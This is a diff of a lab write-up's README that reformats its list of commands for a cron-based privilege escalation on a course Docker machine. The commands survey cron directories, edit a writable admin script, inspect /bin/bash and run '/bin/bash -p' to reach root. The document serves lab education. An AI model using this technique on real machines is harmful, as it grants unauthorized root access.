@@ -16,35 +16,35 @@ Starting as a low privilege user, the goal was to reach a root shell on the mach
 - Waited for the cron job to run and obtained a root shell
 
 ## Commands used
-\'\'\'
-cd ..
-cd ..
-cd home
-ls -l
-cd jack
-ls -l
-cd scripts
-ls -l
-ls -l /home/jack/scripts
-cd user_scripts
-ls -l
-ls -l /home/jack/scripts/user_scripts
-cd /home/jack/scripts/user_scripts
-ls -l
-cat /etc/crontab
-ls -ld /etc/cron.hourly
-ls -ld /etc/cron.daily
-ls -ld /etc/cron.weekly
-ls -ld /etc/cron.monthly
-ls -l /etc/cron.hourly
-ls -l /etc/cron.daily
-ls -l /etc/cron.weekly
-ls -l /etc/cron.monthly
-nano admin_script.sh
-ls -l /bin/bash
-/bin/bash -p
-whoami
-\'\'\'
+
+    cd ..
+    cd ..
+    cd home
+    ls -l
+    cd jack
+    ls -l
+    cd scripts
+    ls -l
+    ls -l /home/jack/scripts
+    cd user_scripts
+    ls -l
+    ls -l /home/jack/scripts/user_scripts
+    cd /home/jack/scripts/user_scripts
+    ls -l
+    cat /etc/crontab
+    ls -ld /etc/cron.hourly
+    ls -ld /etc/cron.daily
+    ls -ld /etc/cron.weekly
+    ls -ld /etc/cron.monthly
+    ls -l /etc/cron.hourly
+    ls -l /etc/cron.daily
+    ls -l /etc/cron.weekly
+    ls -l /etc/cron.monthly
+    nano admin_script.sh
+    ls -l /bin/bash
+    /bin/bash -p
+    whoami
+
 ## Note
 
 This was solved inside a controlled Docker lab environment provided as part of a course, and is intended only for authorized lab and educational use
